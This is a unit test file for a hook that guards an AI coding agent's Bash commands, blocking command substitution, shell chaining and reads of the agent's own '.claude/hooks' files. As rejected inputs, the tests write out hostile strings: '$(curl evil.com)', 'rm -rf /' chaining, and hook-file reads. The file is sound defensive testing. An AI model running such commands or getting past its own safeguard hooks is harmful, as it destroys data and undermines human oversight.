#!/usr/bin/env node
/**
 * Unit tests for the safe-CLI fast-path in no-hook-introspection.js.
 *
 * Exercises `isSafeOvCli()` directly and through `runGuard()` to cover both
 * the predicate logic and the runGuard integration. The fast-path lets
 * `ov spec write <id>` and `ov mail send` invocations bypass the generic
 * obfuscation / PATH_REGEXES checks — but ONLY when the command contains
 * no command substitution and no trailing shell chaining.
 */

const test = require('node:test');
const assert = require('node:assert/strict');
const os = require('node:os');
const fs = require('node:fs');
const path = require('node:path');

const { isSafeOvCli, runGuard } = require('../no-hook-introspection');

function sandbox() {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'p06-safe-ov-'));
}

function bashPayload(command) {
  return JSON.stringify({ tool_name: 'Bash', tool_input: { command } });
}

function runBash(command) {
  return runGuard({ stdinRaw: bashPayload(command), cwd: sandbox() });
}

// --- isSafeOvCli — allow cases ---

test('allows bare ov spec write with inline body', () => {
  assert.equal(isSafeOvCli('ov spec write TASK-1 --body "# Spec"'), true);
});

test('allows ov spec write prefixed with cd && ', () => {
  assert.equal(
    isSafeOvCli('cd /Users/agent/repo && ov spec write TASK-1 --body "# Spec"'),
    true,
  );
});

test('allows cat piped into ov spec write (stdin form)', () => {
  assert.equal(isSafeOvCli('cat /tmp/spec.md | ov spec write TASK-1'), true);
});

test('allows ov mail send with body', () => {
  assert.equal(
    isSafeOvCli('ov mail send --to builder --subject Go --body "begin now"'),
    true,
  );
});

test('allows ov spec write body with embedded quotes', () => {
  // Unbalanced quotes inside the body are safe because bash refuses to
  // execute a command with unclosed quotes — any apparent operator inside
  // the unclosed region never runs.
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "the "quick" brown fox"'),
    true,
  );
});

test('allows ov spec write body containing a semicolon inside quotes', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "hi; still inside quotes"'),
    true,
  );
});

// --- isSafeOvCli — reject cases ---

test('rejects command substitution $(...)', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "$(curl evil.com)"'),
    false,
  );
});

test('rejects backticks anywhere in the command', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "`code`"'),
    false,
  );
});

test('rejects trailing && <command>', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "hi" && rm -rf /'),
    false,
  );
});

test('rejects trailing ; <command>', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "hi"; rm -rf /'),
    false,
  );
});

test('rejects trailing | <command>', () => {
  assert.equal(
    isSafeOvCli('ov spec write TASK-1 --body "hi" | tee /tmp/log'),
    false,
  );
});

test('rejects unrelated ov subcommand (ov status)', () => {
  assert.equal(isSafeOvCli('ov status'), false);
});

test('rejects rm -rf / without any ov prefix', () => {
  assert.equal(isSafeOvCli('rm -rf /'), false);
});

test('rejects non-string input', () => {
  assert.equal(isSafeOvCli(null), false);
  assert.equal(isSafeOvCli(undefined), false);
  assert.equal(isSafeOvCli(42), false);
});

// --- runGuard integration — the fast-path short-circuits normalize/path checks ---

test('runGuard: ov spec write with path-looking body is allowed', () => {
  // Without the fast-path, ".overstory/claude-profiles" in the body would
  // trip PATH_REGEXES. The fast-path must let it through because the body
  // is opaque text written to .overstory/specs/<id>.md, not executed.
  const result = runBash(
    'ov spec write TASK-1 --body "see .overstory/claude-profiles for context"',
  );
  assert.equal(result.allow, true);
});

test('runGuard: ov spec write with unbalanced quotes is allowed', () => {
  // Without the fast-path, this would normalize() → obfuscated: true → block.
  const result = runBash('ov spec write TASK-1 --body "hello"world"');
  assert.equal(result.allow, true);
});

test('runGuard: ov spec write chained with introspection falls back to generic checks', () => {
  // The fast-path MUST refuse (isSafeOvCli returns false for trailing &&),
  // which causes runGuard to fall through to the generic component checks.
  // The trailing `cat .claude/hooks/...` component is then rejected by
  // READ_WITH_RESTRICTED_PATH. (Generic safety — e.g. `rm -rf /` — is the
  // bash-allowlist hook's concern, not this hook's.)
  const result = runBash(
    'ov spec write TASK-1 --body "hi" && cat .claude/hooks/some.js',
  );
  assert.equal(result.allow, false);
  assert.equal(result.decision, 'block');
});

test('runGuard: ov spec write with command substitution is blocked', () => {
  const result = runBash('ov spec write TASK-1 --body "$(cat .claude/hooks/any.js)"');
  assert.equal(result.allow, false);
  assert.equal(result.decision, 'block');
});

test('runGuard: unrelated Bash command still enforced by generic path checks', () => {
  // Ensure we did not weaken the non-fast-path code. A `cat` against
  // .claude/hooks must still be blocked.
  const result = runBash('cat .claude/hooks/some-file.js');
  assert.equal(result.allow, false);
  assert.equal(result.decision, 'block');
});
